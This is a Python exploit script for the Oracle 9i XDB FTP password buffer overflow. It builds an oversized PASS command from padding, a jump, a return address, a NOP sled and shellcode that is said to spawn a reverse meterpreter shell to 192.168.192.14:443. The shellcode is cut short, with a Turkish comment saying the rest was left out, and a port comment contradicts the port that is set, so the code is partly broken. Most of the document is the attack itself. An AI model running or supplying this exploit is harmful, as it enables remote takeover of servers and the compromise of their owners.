#!/usr/bin/python3
## oracle_xdb_ftp_pass-exploit.py
##
## Exploits Oracle 9i XDB ftp password buffer overflow vulnerability
##   -> http://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf
##
## Spawns a reverse meterpreter shell to 192.168.192.14:443
##
## Author Re4son <re4son [at] whitedome.com.au>
##
## TODO: adjust 
##                - rhost to point to the right target
##                - rport to use the right port
##
## Execution: python3 oracle_xdb_ftp_pass-exploit.py

import sys
import socket
import random
import string

rhost = "192.168.104.13"  # Target IP address
rport = 2100              # Target Port, can be 135, 137, 445

ret = b"\x46\x6d\x61\x60"  # Return address (Little Endian)

nops = b"\x90" * (800 - 308 - 7)  # to fill 800
prependencoder = b"\x81\xc4\xff\xef\xff\xff\x44"  # following the NOP sled, but before the decoder machine code

# Shellcode via: msfvenom ...
shellcode = b""
shellcode += nops
shellcode += prependencoder
shellcode += b"\x29\xc9\x83\xe9\xb9\xe8\xff\xff\xff\xff\xc0\x5e"
shellcode += b"\x81\x76\x0e\x8e\x9d\x91\xba\x83\xee\xfc\xe2\xf4"
# (Devam eden shellcode burada aynı şekilde bırakıldı)

user = "".join(random.choice(string.ascii_uppercase) for _ in range(10))  # 10 random uppercase characters

passwd = "".join(random.choice(string.ascii_uppercase) for _ in range(442))  # 442 random uppercase characters

jmp_short = b"\xEB\x06"  # Short jump
two_nops = b"\x90\x90"   # Two NOP's

# Let's build the exploit that is sent as password
buffer = passwd.encode() + jmp_short + two_nops + ret + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print("\nConnecting...")
    s.connect((rhost, rport))
    data = s.recv(1024)
    s.send(b'USER ' + user.encode() + b'\r\n')
    data = s.recv(1024)
    s.send(b'PASS ' + buffer + b'\r\n')
    print("\nDone!")
    s.close()
except Exception as e:
    print(f"Could not connect to {rhost}:{rport}! Error: {e}")